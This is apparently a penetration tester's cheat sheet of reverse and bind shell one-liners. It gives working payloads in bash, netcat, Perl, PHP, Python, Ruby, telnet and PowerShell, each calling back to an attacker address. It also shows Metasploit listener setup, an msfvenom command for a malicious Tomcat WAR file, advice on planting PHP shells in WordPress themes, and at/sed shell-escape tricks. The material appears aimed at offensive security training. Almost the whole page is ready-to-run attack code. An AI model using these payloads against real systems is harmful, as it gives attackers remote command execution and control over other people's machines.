# Shells

### Best Resource:

{% embed url="https://revshells.com" %}

### Reverse Shells

**Listeners**

```
nc -nlvp 9001
# or a more stable listener
rlwrap --always-readline nc -nvlp 443
```

* Always set up a **netcat** listener before executing a bash reverse shell
* You can also use **multi/handler** from **metasploit** to catch incoming reverse shells

```
msfconsole
use exploit /multi/handler
set LHOST 172.16.6.1
set LPORT 9001
run
```

**Netcat Reverse Shell**

```
nc 172.16.6.1 9001 -e /bin/sh
```

* Standard **netcat** reverse shell (only works with some versions of nc)

### **Bash Reverse Shells**

* Good first attempt at a shell.

```
bash -i >& /dev/tcp/172.16.6.1/1234 0>&1
```

* Best **bash** reverse shell option, has the highest percentage success rate.&#x20;

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1 | nc 172.16.6.1 1234 >/tmp/f
```

### **Perl Reverse Shell**

```
perl -e 'use Socket;$i="172.16.6.1";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### **PHP Reverse Shell**

```
php -r '$sock=fsockopen("172.16.6.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
```

* Standard PHP reverse shell typically used for injection on the terminal environment or into a web application

```
$sock=fsockopen("172.16.6.1", 1234);exec("/bin/sh -i <&3 >&3 2>&3");
```

* This php shell is used when you can inject php code into a theme file of a CMS (think wordpress)
* Also have the option of attempting p0wny.php shell for wordpress

{% embed url="https://github.com/flozz/p0wny-shell/blob/master/shell.php" %}
p0wny.php download&#x20;
{% endembed %}

* Most effective is the php-reverse-shell.php when it comes to wordpress and php reverse shells in general&#x20;

{% embed url="https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php" %}
php\__reverse\__&#x73;hell.php
{% endembed %}

### **Python Reverse Shell**

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.6.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

* Troubleshooting lessons

```
which python
which python3
/usr/bin/python
/usr/bin/python3
```

* Try the absolute paths when `python3` or `python` are not working to trigger your reverse shell
* Standard python reverse shell

### **Ruby Reverse Shell**

```
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("172.16.6.1","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

* Linux ruby reverse shell

```
ruby -rsocket -e 'c=TCPSocket.new("172.16.6.1","1234");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

* Windows ruby reverse shell

### **War Reverse Shell**

```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.6.1 LPORT=1234 -f war > /home/kali/Documents/shell.war
```

* This will generate a war file for upload on the **Tomcat** CMS. Once uploaded click on the shell option to activate it.
* Catch this shell with **multi/handler** or just **nc**

```
msfconsole
use exploit /multi/handler
set payload java/jsp_shell_reverse_tcp
set LHOST 172.16.6.1
set LPORT 1234
run
```

#### AT

```bash
echo "/bin/sh <$(tty) >$(tty) 2>$(tty)" | at now; tail -f /dev/null
```

#### SED

```bash
sed -n '1e exec sh 1>&0' /etc/hosts
```

### **Reverse shell over the Telnet Protocol**

```
mknod a p; telnet 172.16.6.1 1234 0<a | /bin/sh 1>a
```

* This reverse shell makes a special character file (mknod) uses telnet to call back and direct standard output to the character file via the binary /bin/sh

### Powershell

```
powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### Bind Shells

### **Netcat Bind Shell**

```
nc -nlvp 1234 -e /bin/sh
```

* This is executed on the target box and waits for an incoming connection

```
nc [target box ip] 1234
```

* This is executed on your attack box to connect to the listener on the target
